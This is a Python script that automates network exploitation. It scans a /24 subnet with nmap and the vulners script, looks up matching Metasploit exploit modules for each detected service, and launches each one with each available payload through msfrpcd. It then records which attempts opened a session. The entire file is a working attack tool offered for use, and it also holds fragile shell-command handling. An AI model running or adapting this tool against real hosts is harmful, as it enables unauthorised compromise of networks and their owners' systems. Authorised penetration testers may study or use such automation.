import os
import sys
import time
from pymetasploit3.msfrpc import *
import nmap
import pandas as pd

startDir = os.path.dirname(os.path.realpath(sys.argv[0]))

# start msf remote api
os.system("msfrpcd -P testpw -S")
time.sleep(5) # pause for the service to fully start
client = MsfRpcClient('testpw', port=55553, ssl=False) # make connection

cid = client.consoles.console().cid # create console and get Id
console = client.consoles.console(cid)

nm = nmap.PortScanner()

nm.scan(hosts="10.0.0.1/24", arguments='-O -sV -T4 -Pn --script vulners --exclude 10.0.0.6')

# '/' is not platform independant and neither is 'cd' #
def findModules(service, details, port):
    hostDir = 'cd ' + startDir[1:] + '/' + host
    outFile = service + str(port) + '.csv'
    console.write('cd /')
    while console.read()['busy'] == "True":
        time.sleep(1)
    console.write(hostDir) # switch into host dir if not already
    while console.read()['busy'] == "True":
        time.sleep(1)
    search = 'search ' + service + ' -S ' + details + ' type:exploit && rank:excellent || rank:good -o ' + outFile
    try:
        console.write(search)
        while console.read()['busy'] == "True":
            time.sleep(1)
    except:
        pass
    return outFile


for host in nm.all_hosts():
    #df2 = pd.DataFrame(columns=['Host','Service','Port','Exploit','Payload','Result'])
    exploitObjects = []
    os.system('cd / && cd ' + startDir[1:] + ' && mkdir ' + host)
    for port in nm[host]['tcp'].keys():
        service = str(nm[host]['tcp'][port]['name'])
        details = str(nm[host]['tcp'][port]['product']) + " " + str(nm[host]['tcp'][port]['version'])
        exploitFile = findModules(service, details, port)
        filePath = host + "/" + exploitFile
        try:
            df = pd.read_csv(filePath, skipinitialspace=True, usecols=['Name'])
        except:
            os.system("killall ruby")
            break
        dfLen = len(df)
        # countMSMod = countMSMod + dfLen
        if dfLen > 0:
            for index, row in df.iterrows():
                exploitName = row['Name'][8:]
                print("Attempting module: " + exploitName)
                exploit2 = client.modules.use('exploit', exploitName)
                if len(exploit2.targetpayloads()[0]) >= 1:
                    try: # set remote host
                        exploit2['RHOSTS'] = host
                    except:
                        try:
                            exploit2['RHOST'] = host
                        except:
                            pass
                    try: # set port number
                        exploit2['RPORT'] = port
                    except:
                        try:
                            exploit2['RPORTS'] = port
                        except:
                            pass

                    for item in exploit2.missing_required:
                            print("Item not set: " + item + ". Exiting exploit " + exploitName)

                    sessionsBefore = len(client.sessions.list)
                    print("Sessions before: " + str(sessionsBefore))
                    time.sleep(1)
                    failed = True
                    i = 0
                    while failed is True and i <= len(exploit2.targetpayloads())-1:
                        try:
                            payload = exploit2.targetpayloads()[i]
                            payloadObj = client.modules.use('payload', payload)
                            console.run_module_with_output(exploit2, payload=payloadObj)
                            failed = False
                        except:
                            i += 1
                    time.sleep(5)
                    if len(client.sessions.list) > sessionsBefore:
                        print("The exploit worked!")
                        result = 'Success'
                    else:
                        print("The exploit failed")
                        result = 'Fail'
                    print("Sessions after: " + str(len(client.sessions.list)))

                    hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
                    exploitObjects.append(hostExploits)
                else:
                    print("No payload selected for: " + exploitName)

                #print("IP               Service             Port            Exploit                   Payload             Result             ")
                #print(hostExploits["IP"] + "            " + hostExploits["Service"] + "            " + hostExploits["Port"] + "            " + hostExploits["Exploit"] + "         " + hostExploits["Payload"] + "         " + hostExploits["Result"])

        else:
            pass # No modules found for this service / port


    # print("Exploits for host: " + host + "\n")
    # print("IP               Service             Port            Exploit                   Payload             Result             ")
    # print(hostExploits["IP"] + "            " + hostExploits["Service"] + "            " + hostExploits["Port"] + "            " + hostExploits["Exploit"] + "         " + hostExploits["Payload"] + "         " + hostExploits["Result"])
    # # print(df2.head(20))
    for x in exploitObjects:
        print(x)

# close msfrpcd
os.system("killall ruby")
